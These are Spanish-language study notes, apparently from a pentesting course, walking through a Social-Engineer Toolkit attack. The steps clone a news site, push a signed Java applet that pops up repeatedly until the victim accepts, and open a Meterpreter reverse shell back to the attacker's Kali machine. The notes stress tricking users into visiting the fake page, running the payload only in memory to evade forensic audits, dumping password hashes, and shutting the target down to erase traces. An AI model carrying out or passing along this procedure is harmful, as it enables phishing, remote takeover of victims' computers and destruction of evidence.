Ataque con set :2

La clave es convencer al usuario que estamos atacando a que
ingresen ala ip donde tenemos falsificada la  web .

vamos aumentar la capacidad de estos  ataques
recordemos que set tiene una imprementacion de metasploit
y con armitage o atraves de la cosola de metasploit ,
estamos accediendo al core del Framework para usarlo para
diferentes ataques :

ahora vamos a tratar de ejecutar un exploit con un payload en
metasploit desde set usando una estrategia de asociado .

root@edwin:~# setoolkit

en otra consola debemos inicializar el servicio de postgres
    root@edwin:~# service postgresql start
    root@edwin:~# service postgresql status
● postgresql.service - PostgreSQL RDBMS
   Loaded: loaded (/lib/systemd/system/postgresql.service; disabled; vendor preset: dis
   Active: active (exited) since Mon 2019-07-29 19:48:48 EDT; 14s ago
  Process: 13575 ExecStart=/bin/true (code=exited, status=0/SUCCESS)
 Main PID: 13575 (code=exited, status=0/SUCCESS)

Jul 29 19:48:48 edwin systemd[1]: Starting PostgreSQL RDBMS...
Jul 29 19:48:48 edwin systemd[1]: Started PostgreSQL RDBMS.

debemos inicializar la base de datos antes de usar metasploit

ahora nos vamos a comunicar con metasploit atraves de set ,
pero igual debemos inicializar la base de datos para que
funcione debidamente

ataque de ingenieria social (1)
    ataque (2) set:webattack>
 lo que vamos hacer es la primera es la primera opcion

 'set:webattack>1

 The first method will allow SET to import a list of pre-defined web
 applications that it can utilize within the attack.

 The second method will completely clone a website of your choosing
 and allow you to utilize the attack vectors within the completely
 same web application you were attempting to clone.

 The third method allows you to import your own website, note that you
 should only have an index.html when using the import website
 functionality.

   1) Web Templates
   2) Site Cloner
   3) Custom Import

  99) Return to Webattack Menu

set:webattack>'

lo que hace este ataque es inyectar codigo de java
mas bien enviar un codigo de java en la pagina esperando
que eventualmente el usuario lo ejecute y una vez lo
ejecute  podamos hacer una inyeccion de java

en este caso vamos a clonar un sitio diferente

set:webattack>2
set> Are you using NAT/Port Forwarding [yes|no]:
recordemos que la Configuracion que tenemos es atravez de la
interfaces bridge adapter estas tienen ip independientes
no hay ninguna redireccionamiento de puertos
entoces deciomos (no)


    set:webattack>2
    [-] NAT/Port Forwarding can be used in the cases where your SET machine is
    [-] not externally exposed and may be a different IP address than your reverse listener.
    set> Are you using NAT/Port Forwarding [yes|no]:

        decimos que no por que estamos usando ip
        independientes

        set> IP address or URL (www.ex.com) for the payload listener (LHOST) [10.28.0.66]:

@@@@@@@@@@@@@@@@@@@@@@@@
    la deje asi por default pero en win10 puse la ip
    real de kali y asi pude acceder a la pagina clonada
    de set que fue (el tiempo .com )
        vamos a dejarla asi aver que pasa con esa ip de tunel
        tun0: flags=4305<UP,POINTOPOINT,RUNNING,NOARP,
                MULTICAST>  mtu 1500

        inet 10.28.0.66  netmask 255.255.255.255  destination
        10.28.0.65


        esta es mi ip :
        wlan0: flags=4163<UP,BROADCAST,RUNNING,MULTICAST>  mtu
        1500

        inet 192.168.1.17


    damos enter

para este ataque necesitamos un certificado de web
es un certificado firmado :

tenemos varias opciones
    podemos cargar un certificado que yo ya tenga
        (esta opcion es muy recomendada ) para https
        funcione bien y el ataque tenga sentido y no
        levante sospechas
    podemos comprar un certificado para montarlo en la pagina
    web

    en este caso vamos a usar el certificado que ya viene
    dentro de set

    certificate.
Select which option you want:
1. Make my own self-signed certificate applet.
2. Use the applet built into SET.
3. I have my own code signing certificate or applet.

Enter the number you want to use [1-3]: 2


[*] Okay! Using the one built into SET - be careful, self
signed isn't accepted in newer versions of Java :(
[-] SET supports both HTTP and HTTPS
[-] Example: http://www.thisisafakesite.com
set:webattack> Enter the url to clone:www.eltiempo.com
    aqui ponemos el sitio que vamos a clonar

    What payload do you want to generate:
        aqui nos pregunta que payload vamos a usar
        vamos a usar el primero
        vamos a tratar de ejecutar un meterpreter contra
        el objetivo
        es interesante este meterpreter por que se ejecuta
        en la memoria ram , no va al disco duro
        esto nos ayuda a que cuando el objetivo
        reinicie el equipo la informacio se pierde
        para no dejar rastros del ataque
            este es muy dificil de identificar
            en una auditoria forence
            una vez la maquina se reinicia no hay forma de
            verificarlo

            set:payloads>1
set:payloads> PORT of the listener [443]:
    el puerto por donde se van a recibir las peticiones

    set:payloads> Enter the number for the payload
    [meterpreter_reverse_https]:

        cual es el payload que vamos a usar como tal
        vamos a usar el reverse_tcp que ya hemos
        usado anteriormente

recordar que la vez anterior usamos un meterpreter bin por
TCP  tambien en donde yo establecia la coneccion desde mi
maquina de kali hacia el objetivo

ahora vamos hacer un reverse para que sea el quien inicia
la conexion hacia mi kali , lo que hacemos es obligar la
maquina a que ejecute en codigo de java que va a ejecutar
meterpreter y me va a dar a mi acceso


Select the payload you want to deliver via shellcode injection

   1) Windows Meterpreter Reverse TCP
   2) Windows Meterpreter (Reflective Injection), Reverse HTTPS Stager
   3) Windows Meterpreter (Reflective Injection) Reverse HTTP Stager
   4) Windows Meterpreter (ALL PORTS) Reverse TCP

set:payloads> Enter the number for the payload [meterpreter_reverse_https]:
solo damos enter para que ejecute es meterpreter
o podemos escoger alguno de esos meterpreter que estan
en la lista

ya esta cargando todo este tema hay que esperar


@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@
    nota  ; en win10 puse mi ip de kali y set comenzo a
        funcionar, lo que quiero decir es que despues de
        hacer todo esto el queda en modo de espera hasta
        que el objetivo entra a la ip que nosotros dimos
        recordar que anteriormente tenia una confusio
        por el uso del vpn , este medio una ip tunel
        diferente  a la ip real
        la ip del tunel no funciono solo la ip real de
        kali,


nota " recordemos cuando nosotros clona vamos con httclack
        que demoraba mas tiempo de los que se demora set
        lo que pasa es httrack sacaba una copia relativa
        de todo el sitio osea bajaba absolutamente todo
        desde codigo , rutas , imagenes por eso demora mas
        tiempo
        en el caso de set lo que el hace es bajar
        la pagina inicial y hace referencia relativas a las
        ubicaciones de internet donde estan los enlaces

        dependiendo de los sitios que uno clona con set
        no siempre sean exacto osea puede que alguna
        hoja de estilo de css no quede bien o que no queda
        referencia entrelazada

        se nos recomienda es revizar el codigo que se
        descarga para que antes de publicar la ip de
        kali atarves de X pagina , revizar que el
        sitio   sea lo mas real  posible "


despues de que el objetivo entre a url osea la ip que
tenemos va a cargar un archivo java , sale una ventana
emergente pidiendo que corra la aplicacion  , una cosa
interesante de este app de java es que se carga muchas
veces , casi obligando al usuario a que le de aceptar
,si le damos cancelar el no se va , cuando el objetivo
(usuario) corre el app el se redirige a la pagina
normal que hemos clonado , en ese momento en nuestra
terminal se esta ejecutando el exploit de metasploit
con inicio de una sesion .

debemos de tener en cuenta el proceso de ejecucion se
realizo atraves de un usuario que quizas no tiene muchos
permisos , generalmente los sistemas operativos tienen
diferentes tipos de permisos para ejecutarlo
si el usuario no es administrativo , no tenemos
mucho alcance para husmear en todo el sistema , o
realizar dump de archivos hushdump = copia todos los
hashes ,
con help , podemos tratar de subir de permisos

este meterpreter se esta ejecutando en memoria ram y
que una vez el sistema se reinicie o se apague, se borrara
el app de java ,

lo que podemos hacer es tratar de hacer un shotdown desde
kali hacia el objetivo para apagar el sistema y que
borre cualquier rastro de la app de java que esta en la ram
